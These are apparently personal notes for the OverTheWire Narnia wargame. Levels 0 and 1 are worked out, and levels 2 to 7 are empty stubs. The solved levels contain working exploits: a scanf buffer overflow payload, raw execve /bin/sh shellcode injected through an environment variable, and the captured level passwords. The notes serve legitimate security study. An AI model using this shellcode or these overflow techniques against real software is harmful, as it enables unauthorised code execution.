## What we learned

- bufferoverflow with `scanf`: we can overwrite the stack if there is 
  discrepencies between array length and input (level0)
- we can find shellcode at [exploit-db](https://www.exploit-db.com/shellcodes/50751) or at [shell-storm](https://shell-storm.org/shellcode/index.html)


### Level 0

Flag: `narnia0`


%% --------------------------------------------------- 

### Level 0 -> Level 1

Goal: Buffer overflow with scanf


```
>>> ssh narnia0@narnia.labs.overthewire.org -p 2226

1. check what files does
>>> cat narnia0.c

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}

scanf takes 24 bytes, but buffer only stores 20 of them, so we can overwrite 
4 of them


2. buffer overflow
>>> (python2 -c 'print 20*"A" + "\xef\xbe\xad\xde"'; cat;) | ./narnia0

Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
eaa6AjYMBB



```

Flag: `eaa6AjYMBB`


%% --------------------------------------------------- 

### Level 1 -> Level 2 (REVIEW!! why do we use that particular shell code)

Goal: Environment Exploit by setting shell code as EGG environment variable

[Shell Code - How it works](https://www.sentinelone.com/blog/malicious-input-how-hackers-use-shellcode/)
[Shell Code](http://shell-storm.org/shellcode/files/shellcode-399.html)

```
>>> ssh narnia1@narnia.labs.overthewire.org -p 2226

shellcode:

"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"

"\xeb\x0d\x5f\x31\xc0\x50\x89\xe2\x52\x57\x54\xb0\x3b\xcd\x80\xe8\xee\xff\xff\xff/bin/sh"

"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b\xcd\x80"              


>>> cat narnia.c

#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}

>>> ./narnia1 
Give me something to execute at the env-variable EGG

>>> EGG=$(python2 -c 'print "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"')
>>> export EGG
>>> ./narnia1

>>> cat /etc/narnia_pass/narnia2
Zzb6MIyceT

```

Flag: `Zzb6MIyceT`

%% --------------------------------------------------- 

### Level 2 -> Level 3

Goal: 


```
>>> ssh narnia2@narnia.labs.overthewire.org -p 2226

>>> cat narnia2.c

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}

```

Flag: ``


%% --------------------------------------------------- 

### Level 3 -> Level 4

Goal: 


```
>>> ssh narnia3@narnia.labs.overthewire.org -p 2226

```

Flag: ``


%% --------------------------------------------------- 

### Level 4 -> Level 5

Goal: 


```
>>> ssh narnia4@narnia.labs.overthewire.org -p 2226

```

Flag: ``


%% --------------------------------------------------- 

### Level 5 -> Level 6

Goal: 


```
>>> ssh narnia5@narnia.labs.overthewire.org -p 2226

```

Flag: ``


%% --------------------------------------------------- 

### Level 6 -> Level 7

Goal: 


```
>>> ssh narnia6@narnia.labs.overthewire.org -p 2226

```

Flag: ``


%% --------------------------------------------------- 

### Level 7 -> Level 8

Goal: 


```
>>> ssh narnia7@narnia.labs.overthewire.org -p 2226

```

Flag: ``


